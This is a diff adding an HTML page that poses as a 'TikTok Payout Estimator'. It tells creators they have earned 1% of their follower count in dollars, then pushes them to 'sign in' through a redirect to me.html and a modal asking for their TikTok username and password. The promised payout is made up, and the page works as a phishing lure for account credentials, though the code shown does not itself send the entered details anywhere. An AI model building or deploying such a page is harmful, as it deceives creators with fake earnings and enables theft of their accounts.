@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Payout Estimator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 500px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input {
+            padding: 8px;
+            width: 80%;
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            background-color: #007BFF;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #result {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1; 
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto; 
+            background-color: rgb(0,0,0); 
+            background-color: rgba(0,0,0,0.4); 
+            padding-top: 60px;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 8px;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .proceed-button {
+            background-color: #28a745;
+        }
+
+        .proceed-button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to the TikTok Payout Estimator</h1>
+        <p>
+            This tool helps TikTok creators estimate their potential payout based on their follower count.
+            Enter your number of followers below to see your estimated payout amount.
+        </p>
+        <p>
+            The payout calculation is based on the following rate:
+            <br>
+            <strong>1% of your total followers count</strong>
+        </p>
+        <form id="claimForm">
+            <label for="followers">Enter Your TikTok Followers Count:</label>
+            <input type="number" id="followers" name="followers" min="0" required>
+            <button type="submit">Check Amount</button>
+        </form>
+        <div id="result"></div>
+    </div>
+
+    <!-- Modal for Login -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <h2>Login to Your TikTok Account</h2>
+            <p>Please enter your TikTok login details to proceed.</p>
+            <form id="loginForm">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+                <br><br>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+                <br><br>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal for Proceeding -->
+    <div id="proceedModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeProceedModal">&times;</span>
+            <h2>Congratulations!</h2>
+            <p>You have earned <span id="earningsAmount"></span>.</p>
+            <p>Do you want to proceed to sign in?</p>
+            <button class="proceed-button" id="proceedButton">Proceed</button>
+            <button class="close" id="cancelButton">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('claimForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Get the follower count from the input field
+            var followers = parseInt(document.getElementById('followers').value, 10);
+
+            // Validate the input
+            if (isNaN(followers) || followers < 0) {
+                document.getElementById('result').innerText = 'Please enter a valid follower count.';
+                return;
+            }
+
+            // Calculate the payout based on 1% of follower count
+            var amount = (followers * 0.01).toFixed(2);
+
+            // Display the result
+            document.getElementById('result').innerText = 'Your estimated payout amount is $' + amount;
+
+            // Show the proceed modal
+            document.getElementById('proceedModal').style.display = 'block';
+            document.getElementById('earningsAmount').innerText = '$' + amount;
+        });
+
+        // Get the modals and close buttons
+        var proceedModal = document.getElementById('proceedModal');
+        var loginModal = document.getElementById('loginModal');
+        var closeProceedModal = document.getElementById('closeProceedModal');
+        var closeModal = document.getElementById('closeModal');
+        var proceedButton = document.getElementById('proceedButton');
+        var cancelButton = document.getElementById('cancelButton');
+
+        // Close the proceed modal when the user clicks the close button or cancel button
+        closeProceedModal.onclick = function() {
+            proceedModal.style.display = 'none';
+        }
+        cancelButton.onclick = function() {
+            proceedModal.style.display = 'none';
+        }
+
+        // Proceed to sign-in link (replace '#' with the actual URL of me.html)
+        proceedButton.onclick = function() {
+            window.location.href = 'me.html'; // Redirect to me.html
+        }
+
+        // Close the login modal when the user clicks the close button
+        closeModal.onclick = function() {
+            loginModal.style.display = 'none';
+        }
+
+        // Close the login modal when the user clicks outside of the modal content
+        window.onclick = function(event) {
+            if (event.target == loginModal) {
+                loginModal.style.display = 'none';
+            }
+        }
+
+        // Close the proceed modal when the user clicks outside of the modal content
+        window.onclick = function(event) {
+            if (event.target == proceedModal) {
+                proceedModal.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
